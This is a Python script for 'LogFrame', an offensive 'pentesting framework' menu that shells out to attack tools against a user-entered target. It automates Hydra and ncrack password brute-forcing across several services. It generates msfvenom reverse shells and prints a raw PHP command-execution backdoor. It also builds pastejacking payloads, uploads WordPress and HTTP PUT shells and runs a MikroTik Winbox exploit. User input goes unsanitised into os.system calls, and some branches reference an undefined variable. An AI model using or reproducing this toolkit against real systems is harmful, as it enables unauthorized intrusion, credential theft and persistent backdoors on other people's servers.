# LogFrame-
# By Joyghosh
#Updated-05.06.2020
import sys
import os
import requests
execute=os.system
myip='dig +short myip.opendns.com @resolver1.opendns.com'
mymac="ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"
tor="xterm -e 'tor'"
vpn="python pyscripts/vpn.py"
localhost="./tools/localhost.sh"
usr="cat user"
uagent='"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"'
#------------------------------------------------Logo------------------------------------------------------#
def logo():
    print("""
\033[30m
==[🄱🄻🄰🄲🄺-🄷🄰🅃🄴🄳🄸🅃🄸🄾🄽]==\033[39m
------------------------------------------
\033[91m█░░ █▀█ █▀▀ ▄▄ \033[97m█▀▀ █▀█ ▄▀█ █▀▄▀█ █▀▀
\033[91m█▄▄ █▄█ █▄█ ░░ \033[97m█▀░ █▀▄ █▀█ █░▀░█ ██▄   \033[1;33m[Unreleased]\033[39m
------------------------------------------
        \033[32mPentesting Framework\033[39m
------------------------------------------
    """)
logo()
url=input("Enter Your Target Url(or Skip):-:-- ")
urlh="https://"+url
execute('clear')
def mainmenu():
    print("""
[-] sys-tools             (Show Menu Of Avilable System Tools)
[-] info-tools            (Show Menu Of Avilable Information Gathering Tools)
[-] backdoor-gen          (Show Menu of Avilable Backdoor Generator)
[-] hydra_tools           (Show Menu Of Auto Usable Hydra Tools)
[-] ncrack_tools          (Show Menu Of Auto Usable Ncrack Tools)
[-] pen-tools             (Show Menu Of Avilable Pentesting and Vulnerability Scanner Tools)
[-] Devloper              (Show Information About Devloper)
[-] restart               (To Restart Logframe)
[-] exit                  (To Exit LogFrame)
[-] clear                 (To Clear Terminal)
[-] url-status            (Check Url is Online or Not)
[-] Exploits              (Show Avilable Auto Exploits)
[-] burp-browser          (An Proxied Browser It Works With BurpProxy)
[-] grub-banner           (Grub Target Banner)
[-] bad-tools             (Some Scripts Used By Blackhat)
[-] whoami                (To Show Username on Tool)
[-] set-user              (To Assign New Username For Tool)
    """)
def sys():
    print("""
-| show-mac         (To Show Your Computer Mac-Adress)
-| whatismyip       (To Show Your Public Ip Adress)
-| random-mac       (To Change Mac Adress To Random)
-| tor              (To Lunch Tor)
-| vpn              (Auto Connect To an Vpn)
-| searchsploit     (Metasploit exploit Finder)
-| locate           (File Path Locator)
-| ip-locate        (Ip Locator)
-| localhost.run    (Port Forwording Tool)
-| show-target      (Show The Target You Have Set On Startup)
-| get-targetip     (Get Ip Adress of Target Host)
    """)
def ncr():
    print("""
-|p-ncrack      (Crack Password Of Target Port)
    """)
def exploits():
    print("""
-| put-exploits               (Put Method Exploitions)
-| wp-shell                   (Wordpress Reverse Shell Upload Using MSF)(Auto)
-| mikrotik-exploit           (Exploit Mikrotik Router and Enumerate Username Password)
    """)
def info():
    print("""
[*] check-waf             (Scan For WAF Using Wafw00f)
[*] whois                 (Get Whois Info About Url)
[*] get-header            (Get Url Header)
[*] detect-cms            (Scan For Installed CMS)
[*] get-cnmae             (Dig CNAME Record)
[*] ex-pagelinks          (Extract Pagelinks)
[*] subdomains            (Enumerate Subdomains)
[*] scan-ports            (Scan For Open Ports)
[*] get-wpu               (Enumerate Wordpress Username)
[*] get-wpp               (Enumerate Wordpress Plugins)
[*] get-wpt               (Enumerate Wordpress Themes)
[*] whatweb-target        (Scan Target Using WhatWeb)
    """)
def backdoor():
    print("""
|-| gen-phpshell            (Generate Metasploit Based Php Revarshell)
|-| gen-aspshell            (Generate Metasploit Based Asp Revarshell)
|-| gen-jspshell            (Generate Metasploit Based jsp Revarshell)
|-| gen-jsshell             (Generate Javascript Revarshell)
|-| gen-backdoor            (Generate SimplePhp Based Backdoor [Raw Code])
|-| pastejacking            (Generate pastejacking Demo Payload)
    """)
def hydra():
    print("""
[*] hydra-ftp             (To Crack Ftp Using hydra)
[*] hydra-ssh             (To Crack SSh Using Hydra)
[*] hydra-mysql           (To Crack mysql using hydra)
[*] hydra-postgresql      (To Crack Postgresql Using Hydra)
[*] hydra-cisco           (To Crack Cisco using hydra)
[*] hydra-smb             (To Crack Smb Using Hydra)
[*] hydra-telnet          (To Crack Telnet Using Hydra)
    """)
def pentool():
    print("""
[|] xml-rpcscan                  (Check For Xml Rpc In Wordpress CMS)
[|] sub-take                     (Check For Subdomain Takeover Vulnerablity)
[|] vp-wordpress                 (Scan For Vulnerable Wordpress Plugin)
[|] vt-wordpress                 (Scan For Vulnerable Themes In Wordpress)
[|] commix                       (Command Injection Exploition Tool)
[|] xss-scan                     (Auto Scan For Xss Using XssCon)
[|] cadaver                      (To Exploit Http Put Method and Upload Shell)
[|] xsrf-scan                    (To scan For Cross Site Request Forgery Using xsrfprobe)
    """)
def dev():
    print("""
@ | Joy Ghosh
@ | System00 Security
@ | Joyghoshs@protonmail.com
@ | https://Joyghosh.info
@ | https://github.com/joyghoshs
    """)
def main():
    inp=input("\033[91mLogframe@root~ \033[32m")
    if inp=="ver":
        print("""
        N   | LogFrame (Pro)
        Ver | 1.0
        Rel | 2020
        """)
    elif inp=="clear":
        execute("clear")
        main()
    elif inp=="exit":
        exit()
    elif inp=="help":
        mainmenu()
        main()
    elif inp=="restart":
        execute('python3 framework.py')
    elif inp=="sys-tools":
        sys()
        main()
    elif inp=="info-tools":
        info()
        main()
    elif inp=="backdoor-gen":
        backdoor()
        main()
    elif inp=="hydra_tools":
        hydra()
        main()
    elif inp=="pen-tools":
        pentool()
        main()
    elif inp=="Devloper":
        dev()
        main()
    elif inp=="url-status":
        response = requests.get('https://'+url)
        resp=response.status_code
        if resp==200:
            print("\033[32mOnline")
        else:
            print("\033[31mNot Reachable")
        main()
    elif inp=="whatismyip":
        print("----------------------------")
        execute(myip)
        print("----------------------------")
        main()
    elif inp=="show-mac":
        print("----------------------------")
        execute(mymac)
        print("----------------------------")
        main()
    elif inp=="tor":
        execute(tor)
        main()
    elif inp=="vpn":
        execute(vpn)
        main()
    elif inp=="random-mac":
        inte=input("Enter Interface To Change Mac:- ")
        execute("macchanger -r "+inte)
        main()
    elif inp=="searchsploit":
        expl=input("Enter Exploit To Search:- ")
        execute("searchsploit "+expl)
        main()
    elif inp=="locate":
        file=input("Enter an File Name To Search :- ")
        main()
    elif inp=="ip-locate":
        ip=input("Enter Your Target Ip Adress:- ")
        execute('curl http://ip-api.com/json/'+ip+' -s |python -m json.tool')
        main()
    elif inp=="localhost.run":
        execute(localhost)
        main()
    elif inp=="check-waf":
        execute("wafw00f https://"+url)
        main()
    elif inp=="whois":
        execute("whois "+url)
        main()
    elif inp=="get-header":
        execute("curl -I "+urlh)
        main()
    elif inp=="detect-cms":
        execute("python pyscripts/cms.py -s "+url)
        main()
    elif inp=="get-cname":
        execute('dig '+url+' CNAME')
        main()
    elif inp=="ex-pagelinks":
        print("====================================================================")
        execute("lynx -listonly -dump "+url)
        print("====================================================================")
        main()
    elif inp=="subdomains":
        execute("python3 tools/Sublist3r/sublist3r.py -d "+url)
        main()
    elif inp=="scan-ports":
        execute("nmap -Pn "+url)
        main()
    elif inp=="get-wpu":
        execute('wpscan --url '+url+' -e u')
        main()
    elif inp=="get-wpp":
        execute('wpscan --url '+url+' -e p')
        main()
    elif inp=="get-wpt":
        execute('wpscan --url '+url+' -e t')
        main()
    elif inp=="get-urls":
        execute('./tools/waybackurls/main https://'+url)
        main()
    elif inp=="gen-phpshell":
        lhost=input("Enter Your Ip Adress:- ")
        execute('msfvenom -p php/meterpreter_reverse_tcp LHOST='+lhost+' LPORT=4444 -f raw >>shell.php')
        print("saved in:-")
        execute('pwd ')
        main()
    elif inp=="gen-jsshell":
        execute("python tools/shell.py")
        main()
    elif inp=="gen-backdoor":
        print("""
    - Raw
    \033[31m<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>\033[32m
    """)
        main()
    elif inp=="pastejacking":
        payload=input("Enter command That Executes After User Copy Something From The Page:- ")
        execute("./res/pastejacking.sh "+payload)
        print("Payload Generated :- ")
        execute("pwd")
        main()
    elif inp=="pwd":
        execute('pwd')
        main()
    elif inp=="ls":
        execute('ls')
        main()
    elif inp=="commix":
        urlhs=input("Enter New Url ")
        execute("commix -u "+urlh+" --random-agent")
        main()
    elif inp=="vp-wordpress":
        execute("wpscan --url "+url+" -e vp")
        main()
    elif inp=="vt-wordpress":
        execute("wpscan --url "+url+" -e vt")
        main()
    elif inp=="xml-rpcscan":
        response = requests.get('https://'+url+'/xmlrpc.php')
        resp=response.status_code
        if resp==200:
            print("""
* Xmlrpc.php Is Avilable In This Wordpress site
* It Might be Vulnerable To Bruteforce Attack
            """)
        else:
            print("XML-RPC Not avilable")
        main()
    elif inp=="sub-take":
        execute("./tools/Sublist3r/scollect.sh "+url)
        main()
    elif inp=="burp-browser":
        print("""
        Open BurpSuite
        Defult Proxy is Set To : 127.0.0.1:8080
        """)
        execute("python3 pyscripts/browser/browser.py --no-sandbox")
        main()
    elif inp=="grub-banner":
        execute("nmap -sV --script=banner "+url)
        main()
    elif inp=="hydra-ftp":
        ip=input("Enter Host Or Ip Adress Of ftp Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -t 1 -L '+user+' -P '+passw+' -vV '+ip+' ftp')
        main()
    elif inp=="hydra-ssh":
        ip=input("Enter Host Or Ip Adress Of SSH Server:- ")
        user=input("Enter Username list Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' -t 4 ssh')
        main()
    elif inp=="hydra-mysql":
        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' mysql -V -f')
        main()
    elif inp=="hydra-smb":
        ip=input("Enter Host Or Ip Adress Of SMB Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' smb -V -f')
        main()
    elif inp=="hydra-telnet":
        ip=input("Enter Host Or Ip Adress Of Telnet Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' telnet -V -f')
        main()
    elif inp=="hydra-cisco":
        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' cisco -V -f')
        main()
    elif inp=="hydra-postgresql":
        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
        user=input("Enter Username List Path:- ")
        passw=input("Enter Password List Path:- ")
        execute('hydra -L '+user+' -P '+passw+' '+ip+' postgres -V -f')
        main()
    elif inp=="ncrack-tools":
        ncr()
        main()
    elif inp=="p-ncrack":
        ip=input("Enter Target Ip or Host:- ")
        port=input("Enter Target Port:- ")
        user=input("Enter Username:- ")
        passw=input("Enter Password List Path:- ")
        execute('ncrack -u '+user+' -P '+passw+' '+ip+' -p '+port)
        main()
    elif inp=="logo":
        logo()
        main()
    elif inp=="Exploits":
        exploits()
        main()
    elif inp=="xss-scan":
        agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
        execute('python3 tools/XSSCon/xsscon.py -u'+urlh)
        main()
    elif inp=="wp-shell":
        urls=input("Enter Target Ip Adress Or Host:- ")
        username=input("Enter Username Of Target Site:- ")
        password=input("Enter Password Of Target Site:- ")
        uri=input("Enter Wordpress Path Or URI if Avilable or Skip:- ")
        execute("./res/wp-shell.sh "+url+' '+username+' '+password+' '+uri)
        main()
    elif inp=="cadaver":
        urlss=input("Enter Target Url:- ")
        execute("cadaver "+urlh)
        main()
    elif inp=="put-exploit":
        target=input("Enter Target To Exploit Http PUT method: ")
        port=input("Enter Port Of Target:- ")
        uri=input("Enter Target Url Path Where You Want To Upload Shell With Shell Name(Ex: dev/shell.php):- ")
        shell=input("Enter Path Of You Webshell:- ")
        execute('nmap -p '+port+' '+target+'--script-args http-put.url='+uri+',http-put.file='+shell)
        main()
    elif inp=="mikrotik-exploit":
        ip=input("Enter Target Winbox Ip:- ")
        port=input("Enter Target Port:- ")
        execute('python3 tools/WinboxExploit/WinboxExploit.py '+ip+' '+port)
        main()
    elif inp=="whoami":
        execute(usr)
        main()
    elif inp=="bad-tools":
        print("""


        """)
        main()
    elif inp=="xsrf-scan":
        execute('xsrfprobe --url '+url+' --crawl --user-agent '+uagent)
        main()
    elif inp=="gen-aspshell":
        lhost=input("Enter Your Ip Adress:- ")
        execute('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ip+' LPORT=4444 >> shell.asp')
        print("Saved as : shell.asp In")
        execute('pwd')
        main()
    elif inp=="gen-jspshell":
        lhost=input("Enter Your Ip Adress:- ")
        execute('msfvenom -p java/jsp_shell_reverse_tcp LHOST='+ip+' LPORT=4444 >> shell.jsp')
        print("Saved as : shell.jsp In")
        execute('pwd')
        main()
    elif inp=="show-target":
        print("Your Target :- "+url)
        main()
    elif inp=="get-targetip":
        execute('for server in '+url+'; do echo $server "-"; dig $server +short; done | paste -d " " - - -')
        main()
    elif inp=="whatweb-target":
        execute("whatweb "+url)
        main()
    elif inp=="set-user":
        name=input("Enter Your New Username:- ")
        execute('rm user')
        execute('echo '+name+' >>user')
        main()

    else:
        print(""+inp+ " Command Not Found")
        main()
execute('clear')
logo()
main()
